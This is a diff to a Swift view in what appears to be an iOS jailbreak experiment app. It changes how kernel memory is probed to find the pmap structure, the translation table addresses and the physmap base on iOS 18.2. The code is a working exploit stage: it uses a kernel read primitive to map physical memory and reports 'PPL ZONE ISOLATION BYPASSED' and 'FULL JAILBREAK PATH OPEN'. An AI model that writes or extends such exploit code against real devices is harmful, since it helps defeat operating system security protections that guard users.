@@ -3619,29 +3619,32 @@ struct AMFIExperimentView: View {
             return ExperimentResult(name: "Physmap Access (Exp 74)", success: success, detail: detail, timestamp: Date())
         }
         
-        // Step: vm_map→pmap (scan +0x28 to +0x58)
-        detail += "\n=== Scanning vm_map for pmap ===\n"
+        // Step: vm_map→pmap at +0x50 (confirmed iOS 18.2 layout from research)
+        // Then probe pmap struct: tte at +0x00, ttep at +0x08
+        detail += "\n=== Reading pmap from vm_map+0x50 ===\n"
         var foundPhysBase: UInt64 = 0
         var foundVirtBase: UInt64 = 0
         
-        for off: UInt64 in stride(from: 0x28, to: 0x60, by: 8) {
-            let candidate = ds_kread64_safe(vmMap + off)
-            if !isZonePtr(candidate) { continue }
+        let pmapPtr = ds_kread64_safe(vmMap + 0x50)
+        detail += "pmap ptr (map+0x50): 0x\(String(format: "%llx", pmapPtr))\n"
+        
+        if pmapPtr != 0 {
+            // Read pmap struct fields
+            let tte = ds_kread64_safe(pmapPtr + 0x00)   // VA of L1 translation table
+            let ttep = ds_kread64_safe(pmapPtr + 0x08)  // PA of L1 TT (TTBR value)
+            let pmapMin = ds_kread64_safe(pmapPtr + 0x28)  // process VA min
+            let pmapMax = ds_kread64_safe(pmapPtr + 0x30)  // process VA max
             
-            // pmap→tte at +0x00, pmap→ttep at +0x08
-            let tte = ds_kread64_safe(candidate + 0x00)
-            let ttep = ds_kread64_safe(candidate + 0x08)
+            detail += "  tte  (+0x00): 0x\(String(format: "%llx", tte))\n"
+            detail += "  ttep (+0x08): 0x\(String(format: "%llx", ttep))\n"
+            detail += "  min  (+0x28): 0x\(String(format: "%llx", pmapMin))\n"
+            detail += "  max  (+0x30): 0x\(String(format: "%llx", pmapMax))\n\n"
             
-            // tte = physmap VA (any kernel pointer > 0xffffffd...)
-            // ttep = physical address (0x8... on A12 DRAM)
+            // Validate: tte should be kernel VA, ttep should be physical
             let tteValid = tte > 0xffffffd000000000
-            let ttepValid = ttep >= 0x800000000 && ttep < 0xC00000000
+            let ttepValid = ttep > 0 && ttep < 0x10000000000  // < 1TB physical
             
             if tteValid && ttepValid {
-                detail += "pmap at map+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", candidate)) ✅\n"
-                detail += "  tte (physmap VA): 0x\(String(format: "%llx", tte))\n"
-                detail += "  ttep (physical):  0x\(String(format: "%llx", ttep))\n\n"
-                
                 // CALCULATE PHYSMAP!
                 let physmapSlide = tte &- ttep
                 let gPhysBaseCalc: UInt64 = 0x800000000
@@ -3652,73 +3655,40 @@ struct AMFIExperimentView: View {
                 detail += "gPhysBase = 0x800000000 (A12 constant)\n"
                 detail += "gVirtBase = 0x\(String(format: "%llx", gVirtBaseCalc))\n\n"
                 
-                if gVirtBaseCalc > 0xffffffd000000000 {
-                    detail += "✅ gVirtBase looks valid!\n\n"
-                    
-                    // VERIFY: read kernel base via physmap
-                    let kernPhys = kernBase &- gVirtBaseCalc &+ gPhysBaseCalc
-                    let physmapVA = gVirtBaseCalc &+ (kernPhys &- gPhysBaseCalc)
-                    let verifyVal = ds_kread64_safe(physmapVA)
-                    
-                    detail += "Kernel phys: 0x\(String(format: "%llx", kernPhys))\n"
-                    detail += "Physmap VA: 0x\(String(format: "%llx", physmapVA))\n"
-                    detail += "Read via physmap: 0x\(String(format: "%llx", verifyVal))\n"
-                    detail += "Read direct: 0x\(String(format: "%llx", kernMagic))\n\n"
-                    
-                    if verifyVal == kernMagic && kernMagic != 0 {
-                        detail += "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n"
-                        detail += "PHYSMAP FULLY VERIFIED!\n"
-                        detail += "ANY physical address → kernel VA!\n"
-                        detail += "PPL ZONE ISOLATION BYPASSED!\n"
-                        detail += "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n\n"
-                        detail += "FULL JAILBREAK PATH OPEN!\n"
-                    }
-                    foundPhysBase = gPhysBaseCalc
-                    foundVirtBase = gVirtBaseCalc
+                // VERIFY: read kernel base via physmap
+                let kernPhys = kernBase &- gVirtBaseCalc &+ gPhysBaseCalc
+                let physmapVA = gVirtBaseCalc &+ (kernPhys &- gPhysBaseCalc)
+                let verifyVal = ds_kread64_safe(physmapVA)
+                
+                detail += "Kernel phys: 0x\(String(format: "%llx", kernPhys))\n"
+                detail += "Physmap VA: 0x\(String(format: "%llx", physmapVA))\n"
+                detail += "Read via physmap: 0x\(String(format: "%llx", verifyVal))\n"
+                detail += "Read direct: 0x\(String(format: "%llx", kernMagic))\n\n"
+                
+                if verifyVal == kernMagic && kernMagic != 0 {
+                    detail += "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n"
+                    detail += "PHYSMAP FULLY VERIFIED!\n"
+                    detail += "ANY physical address → kernel VA!\n"
+                    detail += "PPL ZONE ISOLATION BYPASSED!\n"
+                    detail += "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n\n"
+                    detail += "FULL JAILBREAK PATH OPEN!\n"
                 }
-                break
-            }
-            
-            // Also try: tte might be stored differently on iOS 18.2
-            // Check if candidate+0x00 is a large number that could be physical
-            if tte >= 0x800000000 && tte < 0xC00000000 && ttep > 0xffffffd000000000 {
-                // Reversed: ttep is actually the VA, tte is the PA
-                detail += "pmap (REVERSED) at map+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", candidate))\n"
-                detail += "  [+0x00] physical: 0x\(String(format: "%llx", tte))\n"
-                detail += "  [+0x08] VA:       0x\(String(format: "%llx", ttep))\n\n"
-                
-                let physmapSlide = ttep &- tte
-                let gPhysBaseCalc: UInt64 = 0x800000000
-                let gVirtBaseCalc = gPhysBaseCalc &+ physmapSlide
-                
-                detail += "🎉 PHYSMAP (reversed): gVirtBase = 0x\(String(format: "%llx", gVirtBaseCalc))\n"
                 foundPhysBase = gPhysBaseCalc
                 foundVirtBase = gVirtBaseCalc
-                break
+            } else {
+                detail += "tte/ttep validation failed.\n"
+                detail += "  tte valid (kernel VA): \(tteValid)\n"
+                detail += "  ttep valid (physical): \(ttepValid)\n\n"
+                
+                // Dump more of pmap for analysis
+                detail += "pmap dump (first 0x40 bytes):\n"
+                for off: UInt64 in stride(from: 0, to: 0x40, by: 8) {
+                    let v = ds_kread64_safe(pmapPtr + off)
+                    detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\n"
+                }
             }
-        }
-        
-        if foundPhysBase == 0 {
-            detail += "pmap not found. vm_map dump:\n"
-            for off: UInt64 in stride(from: 0, to: 0x60, by: 8) {
-                let v = ds_kread64_safe(vmMap + off)
-                let tag = isZonePtr(v) ? " ← zone" : ""
-                detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\(tag)\n"
-            }
-            
-            // Try reading tte/ttep from each zone pointer candidate
-            detail += "\n=== Deep probe zone candidates ===\n"
-            for off: UInt64 in [0x30, 0x38, 0x50, 0x58] {
-                let candidate = ds_kread64_safe(vmMap + off)
-                if !isZonePtr(candidate) { continue }
-                let v0 = ds_kread64_safe(candidate + 0x00)
-                let v1 = ds_kread64_safe(candidate + 0x08)
-                let v2 = ds_kread64_safe(candidate + 0x10)
-                detail += "  map+0x\(String(format: "%x", off)) → 0x\(String(format: "%llx", candidate)):\n"
-                detail += "    [+0x00] 0x\(String(format: "%016llx", v0))\n"
-                detail += "    [+0x08] 0x\(String(format: "%016llx", v1))\n"
-                detail += "    [+0x10] 0x\(String(format: "%016llx", v2))\n"
-            }
+        } else {
+            detail += "❌ pmap ptr is NULL at vm_map+0x50\n"
         }
         
         let success = foundPhysBase != 0 && foundVirtBase != 0
